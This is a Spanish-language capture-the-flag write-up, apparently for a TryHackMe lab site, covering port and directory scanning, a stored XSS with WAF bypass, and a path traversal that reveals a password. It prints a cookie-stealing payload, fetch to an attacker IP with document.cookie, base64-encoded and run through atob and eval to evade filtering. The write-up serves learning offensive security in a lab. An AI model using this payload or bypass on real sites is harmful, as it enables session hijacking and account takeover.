---
layout: apunte
title: "2. Getting the Flags"
---

<h2>Reconocimiento Inicial</h2>
Comenzamos con un escaneo de puertos.

!**Pasted image 20260413132109.png**

Ahora vamos a escanear dichos puertos más en profundidad.

!**Pasted image 20260413132132.png**

Esto podría permitirnos realizar un XSS.

Vamos a listar directorios web.

```txt
padelify.thm
    ├── config [200 451B]
    ├── js [200 461B]
    ├── logs [200 455B]
    │   └── error.log [200 1KB]
    ├── footer.php [200 33B]
    ├── header.php [200 728B]
    ├── login.php [200 467B]
    └── status.php [200 1KB]
```

Vamos a ver cómo se ve la web.

!**Pasted image 20260413132449.png**

Aquí podemos ver algo de especial interés: El moderador debe aprobar nuestra cuenta.

Vamos a ver qué hay en los archivos que hemos encontrado.

!**Pasted image 20260413132747.png**

Vamos a seguir mirando.

!**Pasted image 20260413132915.png**

Y seguimos.

!**Pasted image 20260413132958.png**

----------------------------
<h2>Profundización</h2>
Si intentamos entrar, por ejemplo a `app.conf`, nos sale lo siguiente:

!**Pasted image 20260413132833.png**

Vamos a ver `error.log`

!**Pasted image 20260413133049.png**

Parecen los logs de error del WAF en principio.

-------------------------------
<h2>Explotación</h2>
Vamos primero a capturar la petición de registro y a probar diferentes payloads en BurpSuite.

!**Pasted image 20260413133641.png**

Como habíamos visto que la `httponly: not set`, podemos intuir un ataque XSS en este formulario para robar la cookie de sesión de `moderator`. Sin embargo, hay un WAF protegiendo el entorno, por lo que tendremos que dar con el bypass correspondiente.

!**Pasted image 20260413134127.png**

Parece que aunque subamos un payload como `<script>alert('XSS')</script>`, no tiene mayor repercusión, así que vamos a probar todos los campos para obtener la cookie de sesión del usuario `moderator`.

!**Pasted image 20260413134635.png**

Parece que un payload con impacto real sí que ha sido detectado. Vamos a probar diferentes técnicas de ofuscación. 

Después de un rato probando, parece que `fetch` y `cookie` son dos palabras que causan problemas con el WAF. Investigo técnicas de ofuscación con comentarios y entidades HTML pero ninguna funciona, por lo que hay que probar otros comandos.

!**Pasted image 20260413142237.png**

Parece que `atob` y `eval` no están capados, por lo que mandamos `fetch('http://IP:PUERTO' + document.cookie)` encodeado en base64.

!**Pasted image 20260413155819.png**

>[!CAUTION] Por algún motivo en mi máquina no funcionó y estuve mucho tiempo atascado, hasta que probé con la attackbox.

Introducimos la cookie en el navegador y refrescamos la página.

!**Pasted image 20260413160012.png**

----------------------------------
<h2>Escalada de Privilegios</h2>
Si le damos al apartado `Live`, podemos ver que nos lleva a una página y que carga documentos:

!**Pasted image 20260413160454.png**

Es aquí donde nos acordamos que había otros como `header.php`, y el más importante: `/config/app.conf`. Vamos a ver si podemos cargar uno inofensivo:

!**Pasted image 20260413160631.png**

Efectivamente sí podemos, vamos a intentar un path traversal aquí:

!**Pasted image 20260413160709.png**

Pero nos bloquea, así que vamos a probar alguna técnica de ofuscación.

!**Pasted image 20260413161135.png**

Bingo! Eso parece una contraseña, vamos a probarla.

!**Pasted image 20260413161312.png**

Y ahí lo tenemos.

